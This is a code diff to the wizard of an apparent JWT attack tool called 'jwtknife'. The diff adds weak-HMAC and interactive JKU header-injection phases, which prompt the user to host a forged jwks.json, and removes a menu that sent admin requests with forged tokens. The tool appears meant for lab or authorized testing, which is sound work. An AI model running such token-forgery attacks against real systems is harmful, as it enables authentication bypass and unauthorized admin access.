@@ -17,7 +17,7 @@ import (
 func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 	rd := bufio.NewReader(in)
 
-	fmt.Fprintln(out, "jwtknife – Phase 0 (setup) + Phase 1 (JWT auth testing)\n")
+	fmt.Fprintln(out, "jwtknife – JWT auth testing wizard\n")
 
 	// ===== JWT input =====
 	if strings.TrimSpace(cfg.RawJWT) == "" {
@@ -72,10 +72,6 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 	authURL := readURL(rd, out, "JWT-required URL: ")
 	adminURL := readURL(rd, out, "Admin-only URL: ")
 
-	fmt.Fprint(out, "Callback base URL (optional): ")
-	cb, _ := rd.ReadString('\n')
-	cb = strings.TrimSpace(cb)
-
 	// ===== HTTP client =====
 	client := httpx.NewClient(httpx.ClientOpts{
 		Timeout:         10 * time.Second,
@@ -83,7 +79,7 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 		MaxRequests:     50,
 	})
 
-	// ===== Phase 0: baseline =====
+	// ===== Baseline =====
 	run.Baseline = report.NewBaseline()
 
 	run.Baseline.Public = report.FromHTTPResult(client.Do(httpx.RequestPlan{
@@ -93,7 +89,6 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 		JWT:       cfg.RawJWT,
 		Placement: placement,
 	}))
-
 	run.Baseline.Auth = report.FromHTTPResult(client.Do(httpx.RequestPlan{
 		Label:     "auth",
 		URL:       authURL.String(),
@@ -101,7 +96,6 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 		JWT:       cfg.RawJWT,
 		Placement: placement,
 	}))
-
 	run.Baseline.Admin = report.FromHTTPResult(client.Do(httpx.RequestPlan{
 		Label:     "admin",
 		URL:       adminURL.String(),
@@ -110,7 +104,7 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 		Placement: placement,
 	}))
 
-	// ===== Phase 1: attacks =====
+	// ===== Phase 1: automatic attacks =====
 	fmt.Fprintln(out, "\nPhase 1: JWT auth attacks")
 
 	input := jwta.AttackInput{
@@ -118,7 +112,6 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 		RawJWT:    cfg.RawJWT,
 		Client:    client,
 		Baseline:  run.Baseline,
-		Callback:  cb,
 		Targets: httpx.Targets{
 			PublicURL: pubURL.String(),
 			AuthURL:   authURL.String(),
@@ -131,52 +124,44 @@ func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
 	run.JWTAttacks = []report.AttackResult{
 		jwta.NewUnverifiedSignatureAttack().Run(input),
 		jwta.NewAlgNoneAttack().Run(input),
-		jwta.NewJWKHeaderAttack().Run(input), // Lab 4
+		jwta.NewWeakHMACAttack().Run(input),
+		jwta.NewJWKHeaderAttack().Run(input),
+	}
+
+	// ===== Phase 2: JKU (interactive) =====
+	fmt.Fprintln(out, "\n[JKU] JWT Key URL (jku) header injection")
+
+	jkuAttack := jwta.NewJKUAttack()
+	preview := jkuAttack.Run(input)
+	run.JWTAttacks = append(run.JWTAttacks, preview)
+
+	for _, s := range preview.Steps {
+		if s.Label == "host-jwks" {
+			fmt.Fprintln(out, "\nSave the following EXACTLY as jwks.json and host it:\n")
+			fmt.Fprintln(out, s.JWT.Token)
+		}
+	}
+
+	fmt.Fprint(out, "\nPaste FULL URL to hosted jwks.json (or press Enter to skip): ")
+	cb, _ := rd.ReadString('\n')
+	cb = strings.TrimSpace(cb)
+
+	if cb != "" {
+		if _, err := url.ParseRequestURI(cb); err == nil {
+			input.Callback = cb
+			run.CallbackBaseURL = cb
+
+			final := jkuAttack.Run(input)
+			run.JWTAttacks = append(run.JWTAttacks, final)
+		} else {
+			fmt.Fprintln(out, "Invalid URL format, skipping JKU attack.")
+		}
 	}
 
 	run.AuthState = report.EvaluateAuthState(run.Baseline, run.JWTAttacks)
-
-	// ===== Post-forge menu =====
-	var forgedJWT string
-	for _, a := range run.JWTAttacks {
-		for _, s := range a.Steps {
-			if s.JWT.Token != "" {
-				forgedJWT = s.JWT.Token
-				break
-			}
-		}
-	}
-
-	if forgedJWT != "" {
-		fmt.Fprintln(out, "\nForged JWT available:")
-		fmt.Fprintln(out, "  1) Print forged JWT")
-		fmt.Fprintln(out, "  2) Send admin request with forged JWT")
-		fmt.Fprintln(out, "  3) Skip")
-		fmt.Fprint(out, "Choose [1-3]: ")
-
-		ch, _ := rd.ReadString('\n')
-		ch = strings.TrimSpace(ch)
-
-		switch ch {
-		case "1":
-			fmt.Fprintln(out, forgedJWT)
-		case "2":
-			res := client.Do(httpx.RequestPlan{
-				Label:     "admin-forged",
-				URL:       adminURL.String(),
-				Method:    "GET",
-				JWT:       forgedJWT,
-				Placement: placement,
-			})
-			fmt.Fprintf(out, "[+] Admin response: %d (%d bytes)\n",
-				res.Status, res.BodyLen)
-		}
-	}
-
 	return run, nil
 }
 
-// ===== helper =====
 func readURL(rd *bufio.Reader, out io.Writer, label string) *url.URL {
 	for {
 		fmt.Fprint(out, label)
